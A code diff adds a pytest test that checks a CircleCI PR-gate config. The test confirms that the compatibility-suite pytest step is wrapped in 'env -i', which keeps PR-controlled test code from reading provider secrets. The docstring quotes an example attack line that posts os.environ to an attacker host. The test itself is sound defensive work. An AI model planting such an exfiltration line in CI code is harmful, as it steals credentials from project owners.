@@ -255,6 +255,37 @@ def test_pr_gate_npm_install_step_scrubs_secrets_from_env(
     )
 
 
+def test_pr_gate_pytest_step_scrubs_secrets_from_env(
+    circleci_config: dict,
+) -> None:
+    """The compat suite under `tests/claude_code/` is PR-controlled code:
+    a malicious PR could add `requests.post(attacker, data=os.environ)`
+    to any test or conftest hook and exfiltrate provider creds that
+    CircleCI injects into every step's env (those creds are what the
+    proxy container needs via `docker -e`; pytest itself only talks to
+    the proxy at localhost:4000).
+
+    Pin the `env -i` scrub on the pytest step so the mitigation cannot
+    silently regress in a future YAML refactor.
+    """
+    job = circleci_config["jobs"][JOB_NAME]
+    command = _find_step_command(job, "Run Claude Code compatibility test suite")
+    assert command, "PR gate must have a step that runs the compat suite."
+    assert "env -i" in command, (
+        "The compat-suite pytest step must wrap the pytest invocation in "
+        "`env -i` so PR-controlled test code cannot read provider secrets "
+        "from the CircleCI job env."
+    )
+    # The pytest invocation must be downstream of `env -i`. Use `rindex`
+    # because the surrounding comment block also mentions pytest in prose.
+    env_i_idx = command.index("env -i")
+    pytest_idx = command.rindex("uv run --no-sync python -m pytest")
+    assert env_i_idx < pytest_idx, (
+        "`env -i` must precede the pytest invocation; otherwise the "
+        "test process still sees the unscrubbed env."
+    )
+
+
 def test_existing_proxy_e2e_anthropic_job_unchanged(circleci_config: dict) -> None:
     """No regression to the existing `proxy_e2e_anthropic_messages_tests`
     job (acceptance criterion). We don't lock its full body, but we do
